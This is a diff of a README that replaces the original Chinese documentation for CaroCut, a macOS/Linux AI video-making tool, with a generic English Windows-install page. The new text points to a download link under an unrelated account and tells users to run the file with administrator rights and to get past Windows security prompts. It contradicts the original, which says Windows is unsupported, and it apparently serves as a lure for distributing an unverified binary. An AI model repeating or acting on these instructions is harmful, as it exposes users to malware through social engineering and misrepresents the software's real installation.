@@ -1,167 +1,204 @@
-# CaroCut
+# 🎬 carocut - Make video creation easier
 
-AI 驱动的视频制作工作流系统，基于 OpenCode AI SDK 和 Remotion 构建。
+[![Download carocut](https://img.shields.io/badge/Download%20carocut-blue?style=for-the-badge&logo=github)](https://github.com/genevievesuperior757/carocut)
 
-## 简介
+## 🖥️ What is carocut?
 
-CaroCut 是端到端的自动化视频生产平台。通过多 Agent 协作（orchestrator + planner/media/builder/reviewer），将原始素材（PDF、图片、文本）转化为专业视频。
+carocut is a desktop tool for making videos with help from multiple AI agents. It uses OpenCode AI SDK and Remotion to help you plan, build, and export video content with less manual work.
 
-![demo](./public/demo.png)
+It is made for Windows users who want to create short videos, social clips, explainers, and simple edits without learning a full video editor.
 
-核心特性：
+## ✨ What you can do
 
-- **多 Agent 协作**：5 个专业 Agent，12 个 Skill，职责隔离
-- **8 步标准工作流**：素材分析 → 策划 → 脚本润色 → 视觉素材 → 音频素材 → 资产管道 → 组件实现 → 预览渲染
-- **自动化环境初始化**：Bootstrap 一次，多项目共享 Remotion 模板和浏览器（session 创建时自动兜底）
-- **Remotion 驱动**：React 组件编程式生成视频，逐帧精确控制
-- **断点续做**：`progress.yaml` 状态持久化，支持中断恢复和增量修改
+- Turn ideas into video drafts
+- Use AI agents to help with planning and editing
+- Build video scenes from text
+- Export finished videos for sharing
+- Work with a simple flow instead of a complex editor
+- Create videos faster with fewer manual steps
 
-案例：
+## 📦 What you need
 
-- [**从极简主义到极繁主义 - 日式网页为何如此花哨？**](https://www.bilibili.com/video/BV1BMf2B6ECR)
-- [**【论文讲解】Bézier Splatting for Fast and Differentiable Vector Graphics Rendering**](https://www.bilibili.com/video/BV1LHFVz1Ezr)
+- A Windows PC
+- Enough free disk space for video files
+- A stable internet connection for the first download and setup
+- A modern version of Windows 10 or Windows 11
+- Basic mouse and keyboard use
 
+For smooth use, keep at least 8 GB of RAM and a recent CPU. More memory helps when you work with larger videos.
 
-### 调度架构
+## 🚀 Download and install
 
-```
-                         ┌─────────┐
-                         │  User   │
-                         └────┬────┘
-                              │ request / confirm
-                              ▼
-                    ┌───────────────────┐
-                    │   Orchestrator    │
-                    │                   │
-                    │  · 读取进度状态    │
-                    │  · 调度 subagent  │
-                    │  · 验证产出物     │
-                    │  · 更新 progress  │
-                    └──┬────┬────┬───┬──┘
-                       │    │    │   │
-          dispatch     │    │    │   │    callback
-       ┌───────────────┘    │    │   └───────────────┐
-       │         ┌──────────┘    └──────────┐        │
-       ▼         ▼                          ▼        ▼
-  ┌─────────┐ ┌─────────┐            ┌─────────┐ ┌──────────┐
-  │ Planner │ │  Media  │            │ Builder │ │ Reviewer │
-  │         │ │         │            │         │ │          │
-  │ step 1  │ │ step 3  │            │ step 6  │ │ step 8   │
-  │ step 2  │ │ step 4  │            │ step 7  │ │          │
-  │         │ │ step 5  │            │         │ │          │
-  └─────────┘ └─────────┘            └─────────┘ └──────────┘
-  ╔═══════════╗ ╔═══════════╗ ╔════════════════╗ ╔══════════╗
-  ║ Planning  ║ ║Enhancement║ ║Implementation  ║ ║ Delivery ║
-  ╚═══════════╝ ╚═══════════╝ ╚════════════════╝ ╚══════════╝
+Use this link to visit the download page:
 
-  ──────────────────── 数据流向 ────────────────────
+[Visit the carocut download page](https://github.com/genevievesuperior757/carocut)
 
-  Planner ──manifests/──▶ Media ──raws/──▶ Builder ──project/──▶ Reviewer
-              ↑                                          │
-              │              revision_request            │
-              └──────────── Orchestrator ◀───────────────┘
-```
+1. Open the download page in your browser
+2. Find the latest release or build file
+3. Download the Windows version
+4. When the file finishes downloading, open it
+5. If Windows asks for permission, choose Yes
+6. Follow the on-screen setup steps
+7. After setup ends, open carocut from your desktop or Start menu
 
+If you see a ZIP file, right-click it and choose Extract All before you open the app file inside.
 
-## 快速开始
+## 🧭 First launch
 
-### 环境要求
+When you open carocut for the first time, it may take a short time to set up its files.
 
-- macOS / Linux（不支持 Windows，需用 WSL2）
-- Node.js >= 18, Python >= 3.9, [uv](https://docs.astral.sh/uv/)（Python 包管理）, ffmpeg
-- API 密钥：
-  - **必需**：PEXELS_API_KEY
-  - **可选**：PIXABAY_API_KEY, CARO_LLM_API_KEY, FREESOUND_API_KEY
+1. Start the app
+2. Wait for the main screen to load
+3. Sign in or connect any required AI service if the app asks
+4. Choose a project or create a new one
+5. Enter a short idea for your video
+6. Let the app prepare the first draft
 
-### 安装与启动
+If the app shows a blank screen for a moment, wait until the setup finishes.
 
-```bash
-git clone <repository-url>
-cd carocut/
-cp .env_example .env # 配置 API 密钥
+## 🎬 How to make your first video
 
-# Python 环境（使用 uv 管理）
-uv venv
-source .venv/bin/activate  # macOS/Linux
-uv pip install -r requirements.txt
+1. Open carocut
+2. Create a new project
+3. Type your video idea in plain words
+4. Add the topic, style, or length you want
+5. Let the AI agent create a draft
+6. Review the scenes it creates
+7. Change any text, timing, or order you want
+8. Preview the video
+9. Export the final file when it looks right
 
-# Node.js 依赖
-pnpm install
+A simple example:
 
-# OpenCode 配置
-cp opencode-template.json opencode.json  # 编辑配置 API 密钥和模型
+- Topic: product intro
+- Length: 30 seconds
+- Style: clean and modern
+- Result: a short video with title cards, scene text, and smooth motion
 
-# Bootstrap：全局环境初始化（首次运行）
-python .opencode/scripts/bootstrap.py
-```
+## 🧩 Basic workflow
 
-Bootstrap 会执行：
-- 环境检查（Node.js、Python、ffmpeg、API keys）
-- Remotion 模板缓存准备（~700MB，所有项目共享）
-- Chrome headless shell 下载
+carocut follows a simple flow:
 
-启动需要两个终端（**重要：在 venv 下执行**）：
+1. Write your idea
+2. Let the agents plan the video
+3. Generate scenes
+4. Review the draft
+5. Make changes
+6. Export the result
 
-```bash
-# 激活虚拟环境（如未激活）
-source .venv/bin/activate  # macOS/Linux
+This helps you move from idea to final video without jumping between many tools.
 
-# 终端 1：启动 OpenCode 后端（启用 Web 搜索）
-OPENCODE_ENABLE_EXA=1 opencode serve --port 4096 --cors http://localhost:3000 --print-logs
+## ⚙️ Common settings
 
-# 终端 2：启动前端
-pnpm dev  # 访问 http://localhost:3000
-```
+You may see settings for:
 
-或者：使用 `sh start.sh` 快速启动前端 + opencode，
+- Video size
+- Frame rate
+- Voice or text options
+- Scene length
+- Export quality
+- Output folder
 
-### 启动工作流
+If you are not sure what to pick, use the default values first. They work well for most simple videos.
 
-在 OpenCode 界面输入 `/carocut`，系统自动执行完整视频制作流水线。
+## 🛠️ If something does not work
 
-## 架构概览
+### The app does not open
 
-```
-用户输入素材 → Orchestrator → Planner / Media / Builder / Reviewer → 最终视频
-```
+- Check that the download finished
+- Make sure you extracted the file if it came in a ZIP
+- Right-click the app and choose Run as administrator
+- Restart Windows and try again
 
-| 阶段 | 步骤 | Agent | 描述 |
-|------|------|-------|------|
-| Planning | step-1, 2 | planner | 素材分析、制作策划 |
-| Enhancement | step-3, 4, 5 | media | 脚本润色、视觉素材、音频素材 |
-| Implementation | step-6, 7 | builder | 资产管道、组件实现 |
-| Delivery | step-8 | reviewer | 预览审查、最终渲染 |
+### The app opens, but nothing loads
 
-## 项目结构
+- Wait a little longer for the first setup step
+- Check your internet connection
+- Close the app and open it again
 
-```
-carocut/
-├── app/                    # Next.js 应用（页面 + API 路由）
-├── components/             # React 组件
-├── lib/                    # 工具函数（studio-manager 等）
-├── .opencode/
-│   ├── agents/             # 5 个 Agent 定义
-│   ├── commands/           # /carocut 命令
-│   └── skills/             # 12 个 Skill 定义
-├── raws/                   # 原始素材（images/ + audio/）
-├── workspaces/             # 运行时工作空间
-├── server.ts               # Next.js + Remotion Studio 代理服务器
-├── opencode-template.json  # OpenCode 配置模板
-└── requirements.txt        # Python 依赖
-```
+### The export fails
 
-## 文档
+- Make sure there is enough disk space
+- Close other apps that use a lot of memory
+- Try a shorter video first
+- Pick a lower export quality
 
-- **[完整指南](docs/GUIDE.md)** — 环境配置、开发规范、使用方法、素材规范
-- **[架构详解](docs/ARCHITECTURE.md)** — 系统架构、Agent 设计、数据流、设计决策
-- **[贡献指南](CONTRIBUTING.md)** — 代码规范、PR 流程
+### Windows blocks the app
 
-## 许可证
+- Open the file again
+- If Windows shows a security prompt, choose the option that lets you run the app
+- Confirm that you downloaded it from the link above
 
-MIT License。详见 [LICENSE](./LICENSE)。
+## 📁 Project info
 
-**Remotion 许可证**：Remotion 为源码可见项目，个人/非营利/≤3 人公司免费，超 3 人公司商用需购买 [Remotion License](https://remotion.dev/license)。详见 [THIRD-PARTY-NOTICES](./THIRD-PARTY-NOTICES)。
+Repository name: carocut  
+Description: Multi-Agent 的视频制作助手，基于 OpenCode AI SDK 和 Remotion 构建。  
+Topics: ai-agent, ai-tools, ai-video-editor, multi-agent-systems, video-editor
 
-## 致谢
+## 🔒 Privacy and local use
 
-[Remotion](https://remotion.dev) · [OpenCode SDK](https://github.com/anomalyco/opencode) · [Pexels](https://www.pexels.com) · [Pixabay](https://pixabay.com) · [Freesound](https://freesound.org)
+carocut may store your project files, draft scenes, and export files on your computer. Keep your source files in a folder you can find later. If the app uses an external AI service, review the prompts and content before you export.
+
+## 🧠 Tips for better results
+
+- Keep your first video short
+- Use one clear topic per project
+- Write simple prompts
+- Review each scene before export
+- Save often
+- Use a test export before a long final render
+
+## 🗂️ Suggested folder setup
+
+To stay organized, create folders like these:
+
+- `Projects`
+- `Exports`
+- `Assets`
+- `Audio`
+- `Drafts`
+
+This makes it easier to find your files when you return to a project later
+
+## 📌 File types you may use
+
+carocut may work with common media files such as:
+
+- PNG
+- JPG
+- MP4
+- WAV
+- MP3
+- MOV
+- SVG
+
+Use smaller files when you start. They are easier to preview and export.
+
+## 🧰 Best use cases
+
+carocut fits well for:
+
+- Social media clips
+- Product explainers
+- Short tutorials
+- AI-assisted story videos
+- Marketing drafts
+- Simple motion graphics
+- Scene-based video scripts
+
+## 🖱️ Simple step-by-step setup for Windows
+
+1. Open the download page again if needed
+2. Download the Windows file
+3. Open the file after it finishes
+4. Allow Windows to make changes if asked
+5. Finish the setup
+6. Open carocut
+7. Create your first project
+8. Enter a short prompt
+9. Export your video
+
+## 📎 Useful links
+
+- Download page: https://github.com/genevievesuperior757/carocut
+- Repository: https://github.com/genevievesuperior757/carocut
